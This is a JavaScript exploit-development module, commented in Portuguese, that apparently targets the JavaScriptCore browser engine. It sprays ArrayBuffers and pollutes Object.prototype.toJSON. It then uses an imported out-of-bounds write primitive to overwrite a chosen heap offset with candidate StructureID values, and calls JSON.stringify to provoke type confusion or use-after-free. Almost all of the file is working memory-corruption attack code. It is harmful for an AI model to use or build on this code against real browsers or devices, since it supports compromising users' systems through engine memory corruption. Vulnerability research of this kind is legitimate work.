// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, KNOWN_STRUCTURE_IDS } from '../config.mjs';

// --- Parâmetros de Teste Configuráveis ---
const SPECULATIVE_TEST_CONFIG = {
    victim_ab_size: 64, // Tamanho do ArrayBuffer que acreditamos estar corrompendo
    
    // Offset específico (relativo ao início de oob_array_buffer_real) onde o crash foi observado.
    // Ajuste este valor se o crash ocorrer em um offset diferente.
    corruption_target_offset_focus: 0x70, 

    // Valores a serem escritos no offset de corrupção
    values_to_write_for_corruption: [
        0xFFFFFFFF, // O valor que causou o crash original
        0x00000000, // Tentar anular (pode ser StructureID inválido ou um ponteiro)
        0x00000001, // Um StructureID pequeno e provavelmente inválido
        0x41414141, // "AAAA" - um padrão comum para depuração
        0x42424242, // "BBBB"
        // Adicionar KNOWN_STRUCTURE_IDS (convertidos para número)
        // Se KNOWN_STRUCTURE_IDS não estiverem preenchidos, parseInt retornará NaN e serão filtrados.
        ...(Object.values(KNOWN_STRUCTURE_IDS)
            .map(idStr => parseInt(idStr, 16))
            .filter(idNum => !isNaN(idNum) && idNum !== null)),
        // Adicionar alguns valores que podem ser IDs de estrutura válidos ou próximos a eles
        // Estes são apenas exemplos hipotéticos
        0x07000100, // Exemplo hipotético para TYPE_ARRAY_BUFFER
        0x0A000200, // Exemplo hipotético para TYPE_JS_FUNCTION
        0x01000000, // Exemplo hipotético para TYPE_JS_OBJECT_GENERIC
    ].filter((value, index, self) => self.indexOf(value) === index), // Remove duplicatas

    bytes_to_write_for_corruption: 4, // StructureID é geralmente uint32_t (4 bytes)
    ppKey: 'toJSON', // Chave do protótipo a ser poluída
    stop_on_first_error_in_toJSON: true, // Parar se um erro for capturado dentro do toJSON poluído
    spray_count_victim_ab: 200, // Número de ArrayBuffers para pulverizar
};
// --- Fim dos Parâmetros ---

export async function testJsonTypeConfusionUAFSpeculative() {
    const FNAME = "testJsonTypeConfusionUAFSpeculative_Focused"; // Nome da função para clareza nos logs
    logS3(`--- Iniciando Teste Focado de UAF/Type Confusion via JSON (S3) (v2.7) ---`, "test", FNAME);
    logS3(`   Config: victim_size=${SPECULATIVE_TEST_CONFIG.victim_ab_size}, ppKey=${SPECULATIVE_TEST_CONFIG.ppKey}`, "info", FNAME);
    logS3(`   Alvo de Corrupção Offset Absoluto: ${toHex(SPECULATIVE_TEST_CONFIG.corruption_target_offset_focus)} (em oob_array_buffer_real)`, "info", FNAME);
    logS3(`   Valores de Teste para Corrupção: ${SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption.map(v => toHex(v)).join(', ')}`, "info", FNAME);

    let overallTestSuccess = false; // Indica se um erro útil foi capturado dentro do toJSON
    let victimAbs_spray = [];

    // Limpeza preliminar de qualquer poluição anterior
    delete Object.prototype[SPECULATIVE_TEST_CONFIG.ppKey];

    // Configura o ambiente OOB uma vez no início
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha crítica ao configurar ambiente OOB. Teste abortado.", "error", FNAME);
        return;
    }

    const corruption_offset_abs = SPECULATIVE_TEST_CONFIG.corruption_target_offset_focus;

    // Validar se o offset focado está dentro dos limites do buffer OOB
    if (corruption_offset_abs < 0 || corruption_offset_abs + SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption > oob_array_buffer_real.byteLength) {
        logS3(`Offset de corrupção focado ${toHex(corruption_offset_abs)} está fora dos limites do oob_array_buffer_real (${toHex(oob_array_buffer_real.byteLength)}). Teste abortado.`, "error", FNAME);
        clearOOBEnvironment();
        return;
    }

    // Pulverizar ArrayBuffers vítimas
    logS3(`Pulverizando ${SPECULATIVE_TEST_CONFIG.spray_count_victim_ab} ArrayBuffers de ${SPECULATIVE_TEST_CONFIG.victim_ab_size} bytes...`, "info", FNAME);
    for(let i=0; i < SPECULATIVE_TEST_CONFIG.spray_count_victim_ab; i++){
        try {
            victimAbs_spray.push(new ArrayBuffer(SPECULATIVE_TEST_CONFIG.victim_ab_size));
        } catch (e) {
            logS3(`Falha ao alocar ArrayBuffer de spray ${i+1}: ${e.message}. Parando spray.`, "warn", FNAME);
            break;
        }
    }
    if (victimAbs_spray.length === 0) {
        logS3("Nenhum ArrayBuffer vítima pulverizado. Abortando.", "error", FNAME);
        clearOOBEnvironment();
        return;
    }
    // O target_victim_ab é um dos pulverizados, usado para acionar JSON.stringify.
    // A corrupção OOB pode atingir qualquer um dos ArrayBuffers pulverizados que calhar de estar no offset alvo.
    const target_victim_ab_for_stringify = victimAbs_spray[victimAbs_spray.length - 1];
    logS3(`${victimAbs_spray.length} ArrayBuffers pulverizados. Um deles será o alvo do JSON.stringify.`, "info", FNAME);
    await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa para estabilização da heap pós-spray


    // Loop principal para testar diferentes valores de corrupção no offset focado
    for (const value_to_write of SPECULATIVE_TEST_CONFIG.values_to_write_for_corruption) {
        if (overallTestSuccess && SPECULATIVE_TEST_CONFIG.stop_on_first_error_in_toJSON) break;

        const ppKey = SPECULATIVE_TEST_CONFIG.ppKey;
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;
        let currentIterationCapturedError = false;
        let originalValueAtCorruptionOffset = null;

        logS3(`Testando valor de corrupção: ${toHex(value_to_write)} no offset ${toHex(corruption_offset_abs)}`, "subtest", FNAME);

        try {
            // 1. Ler valor original no offset de corrupção para restauração
            try {
                originalValueAtCorruptionOffset = oob_read_absolute(corruption_offset_abs, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                logS3(`  Valor original em ${toHex(corruption_offset_abs)}: ${isAdvancedInt64Object(originalValueAtCorruptionOffset) ? originalValueAtCorruptionOffset.toString(true) : toHex(originalValueAtCorruptionOffset)}`, "info", FNAME);
            } catch (e_read_orig) {
                logS3(`  AVISO: Falha ao ler valor original em ${toHex(corruption_offset_abs)}: ${e_read_orig.message}. Esta iteração pode não ser restaurável.`, "warn", FNAME);
                // Continuar mesmo assim, mas a restauração pode falhar ou ser incorreta.
            }

            // 2. Poluir Object.prototype.toJSON
            Object.defineProperty(Object.prototype, ppKey, {
                value: function() {
                    const currentOperationThis = this; // O objeto sendo stringificado
                    logS3(`  [${ppKey} Poluído] Chamado! (Teste com Offset: ${toHex(corruption_offset_abs)}, Valor Corruptor: ${toHex(value_to_write)})`, "vuln", FNAME);
                    
                    let typeString = "N/A";
                    let byteLengthVal = "N/A";
                    try {
                        typeString = Object.prototype.toString.call(currentOperationThis);
                        logS3(`    Contexto 'this': Object.prototype.toString.call(this) = ${typeString}`, "info", FNAME);
                    } catch (e_tostring) {
                        logS3(`    Contexto 'this': Erro ao chamar Object.prototype.toString.call(this): ${e_tostring.message}`, "warn", FNAME);
                    }

                    // Verificar se 'this' ainda se parece com um ArrayBuffer esperado
                    if (!(currentOperationThis instanceof ArrayBuffer && currentOperationThis.byteLength === SPECULATIVE_TEST_CONFIG.victim_ab_size)) {
                        if (currentOperationThis !== target_victim_ab_for_stringify) { // Adicionalmente checa se não é o AB específico do stringify
                           logS3(`    AVISO: 'this' (${typeString}) não é o ArrayBuffer vítima esperado ou foi severamente corrompido.`, "warn", FNAME);
                        }
                    }

                    try {
                        // Tentar operações que podem falhar se o tipo for confundido ou a memória estiver corrompida
                        byteLengthVal = currentOperationThis.byteLength;
                        logS3(`    'this.byteLength' (tentativa): ${byteLengthVal === undefined ? "undefined" : toHex(byteLengthVal)}`, "info", FNAME);
                        
                        // A operação crítica que pode revelar a confusão de tipo / UAF
                        new DataView(currentOperationThis); 
                        logS3(`    [${ppKey} Poluído] new DataView(this) criado com SUCESSO. 'this' parece ser um ArrayBuffer válido.`, "good", FNAME);
                        return { toJSON_executed_ok: true, type: typeString, byteLengthReported: byteLengthVal };
                    } catch (e_op) {
                        logS3(`    [${ppKey} Poluído] ERRO AO OPERAR SOBRE 'this': ${e_op.name} - ${e_op.message}`, "critical", FNAME);
                        logS3(`    ---> SINAL DE TYPE CONFUSION / UAF <--- (Valor Corruptor: ${toHex(value_to_write)})`, "vuln", FNAME);
                        currentIterationCapturedError = true; // Sinaliza que um erro controlável foi pego
                        overallTestSuccess = true;
                        // Retorna um objeto que pode ser identificado no resultado do JSON.stringify
                        return { toJSON_error: true, error_name: e_op.name, error_message: e_op.message, type_at_error: typeString, byteLength_at_error: byteLengthVal };
                    }
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;

            // 3. Realizar a escrita OOB para corromper
            logS3(`    CORRUPÇÃO: Escrevendo ${toHex(value_to_write)} em ${toHex(corruption_offset_abs)}...`, "warn", FNAME);
            oob_write_absolute(corruption_offset_abs, value_to_write, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
            
            await PAUSE_S3(SHORT_PAUSE_S3 / 2); // Pausa mínima para a escrita OOB ter efeito

            // 4. Chamar JSON.stringify no ArrayBuffer vítima
            logS3(`    Chamando JSON.stringify(target_victim_ab_for_stringify)...`, "info", FNAME);
            let stringifyResult = null;
            try {
                stringifyResult = JSON.stringify(target_victim_ab_for_stringify);
                logS3(`    Resultado de JSON.stringify: ${String(stringifyResult).substring(0, 250)}`, "info", FNAME);
                if (stringifyResult && typeof stringifyResult === 'string') {
                    if (stringifyResult.includes("toJSON_error:true")) {
                        logS3("    SUCESSO: Erro foi capturado e retornado pelo toJSON poluído, indicando que o fluxo continuou até lá!", "vuln", FNAME);
                        // overallTestSuccess já deve ter sido setado como true dentro do toJSON
                    } else if (stringifyResult.includes("toJSON_executed_ok:true")) {
                        logS3("    toJSON poluído executou sem erro interno aparente. Nenhuma Type Confusion/UAF óbvia detectada nesta iteração.", "good", FNAME);
                    }
                }
            } catch (e_stringify) {
                // Se o crash for tão severo que nem o try...catch em volta do JSON.stringify o pega,
                // ou se o try...catch dentro do toJSON não foi suficiente.
                logS3(`    CRASH/ERRO EXTERNO durante JSON.stringify: ${e_stringify.name} - ${e_stringify.message}.`, "critical", FNAME);
                console.error(`CRASH? (JSON.stringify UAF/TC Test Error - Offset: ${toHex(corruption_offset_abs)}, Val: ${toHex(value_to_write)}):`, e_stringify);
                currentIterationCapturedError = true; // Consideramos um crash aqui como um "sucesso" na detecção
                overallTestSuccess = true; 
            }

        } catch (mainIterationError) {
            logS3(`  Erro INESPERADO na iteração (Valor: ${toHex(value_to_write)}): ${mainIterationError.message}`, "error", FNAME);
            console.error(`Main Iteration Error (Focused Test):`, mainIterationError);
        } finally {
            // 5. Restaurar valor original no offset de corrupção
            if (originalValueAtCorruptionOffset !== null) {
                try {
                    oob_write_absolute(corruption_offset_abs, originalValueAtCorruptionOffset, SPECULATIVE_TEST_CONFIG.bytes_to_write_for_corruption);
                    logS3(`    Valor em ${toHex(corruption_offset_abs)} restaurado para ${isAdvancedInt64Object(originalValueAtCorruptionOffset) ? originalValueAtCorruptionOffset.toString(true) : toHex(originalValueAtCorruptionOffset)}.`, "info", "CleanupIter");
                } catch (e_restore) {
                    logS3(`    AVISO CRÍTICO: Falha ao restaurar valor em ${toHex(corruption_offset_abs)}. Erro: ${e_restore.message}`, "critical", "CleanupIter");
                }
            }

            // 6. Restaurar Object.prototype.toJSON
            if (pollutionApplied) {
                if (originalToJSONDescriptor) {
                    Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                } else {
                    delete Object.prototype[ppKey];
                }
                // logS3(`    Object.prototype.${ppKey} restaurado.`, "info", "CleanupIter");
            }
        } // Fim do try/catch/finally da iteração

        if (currentIterationCapturedError && SPECULATIVE_TEST_CONFIG.stop_on_first_error_in_toJSON) {
            logS3(`Erro capturado/Crash detectado. Parando teste conforme 'stop_on_first_error_in_toJSON'. Valor problemático: ${toHex(value_to_write)}`, "vuln", FNAME);
            break; 
        }
        await PAUSE_S3(MEDIUM_PAUSE_S3); // Pausa entre diferentes valores de corrupção
    } // Fim do loop de values_to_write_for_corruption

    // Limpeza final do ambiente OOB após todas as tentativas
    clearOOBEnvironment();
    victimAbs_spray = null; // Ajudar o GC
    delete Object.prototype[SPECULATIVE_TEST_CONFIG.ppKey]; // Garantir que a poluição foi limpa

    logS3(`--- Teste Focado de UAF/Type Confusion via JSON Concluído (Sucesso na Detecção de Erro/Crash: ${overallTestSuccess}) ---`, "test", FNAME);
}
